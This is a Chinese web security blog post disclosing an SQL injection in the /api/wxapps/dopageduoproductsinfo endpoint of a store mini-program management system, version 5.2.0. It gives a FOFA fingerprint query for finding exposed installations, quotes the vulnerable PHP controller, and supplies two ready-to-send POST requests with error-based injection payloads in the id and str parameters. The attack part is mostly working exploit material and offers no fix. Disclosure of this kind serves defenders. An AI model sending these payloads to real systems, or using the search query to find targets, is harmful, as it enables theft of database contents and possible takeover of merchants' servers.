---
title: "万能门店小程序管理系统 /api/wxapps/dopageduoproductsinfo SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-dopageduoproductsinfo-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopageduoproductsinfo-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/dopageduoproductsinfo SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/16 08:27
- 602浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

漏洞修复方案

授权

网络安全会议

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/dopageduoproductsinfo 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

SQL注入检测工具

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

深入探索

技术文章订阅

SQL

JSON处理工具

application/api/controller/Wxapps.php

```
//多规格数据自己规格
    public function dopageduoproductsinfo()
    {
        $uniacid = input("uniacid");
        $str = input('str');
        $arr = explode("######", $str);
        $id = input('id');
        $where = "";
        foreach ($arr as $key => &$res) {
            $vv = $key + 1;
            $where .= " and type" . $vv . " = " . "'" . $res . "'";
        }
        $prefix = config('database.prefix');
        $proinfo = Db::query("SELECT * FROM {$prefix}wd_xcx_duo_products_type_value WHERE pid= " . $id . $where);
        foreach ($proinfo as $key => &$value) {
            if ($value['thumb']) {
                $value['thumb'] = remote($uniacid, $value['thumb'], 1);
            }
            $value['salenum'] = $value['salenum'] + $value["vsalenum"];
        }
        $baseinfo = Db::name('wd_xcx_products')->where("id", $proinfo[0]['pid'])->find();
        if ($baseinfo['thumb']) {
            $baseinfo['thumb'] = remote($uniacid, $baseinfo['thumb'], 1);
        }
        if ($baseinfo['shareimg']) {
            $baseinfo['shareimg'] = remote($uniacid, $baseinfo['shareimg'], 1);
        }
        $adata['proinfo'] = $proinfo[0];
        $adata['baseinfo'] = $baseinfo;
        $result['data'] = $adata;
        return json_encode($result);
    }
```

- **id 参数**： 该参数未作任何过滤或转义，直接作为 SQL 中 pid 的值拼接,造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。
- **str 参数中的各个分割后子串**： $str 经 explode("######") 拆分后，每个部分都以 “and type{n} = '用户输入'” 的形式拼接到 SQL 语句中,造成SQL注入漏洞。

# 漏洞复现

```
POST /api/wxapps/dopageduoproductsinfo HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23
```

[![万能门店小程序管理系统 /api/wxapps/dopageduoproductsinfo SQL 注入漏洞](images/img-001-6333038e3a84.webp)](https://image.mrxn.net/a7d8b8bb6fe54d35bc4c2cd3abdfd0c8.webp)

```
POST /api/wxapps/dopageduoproductsinfo HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

str=a'+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)--
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
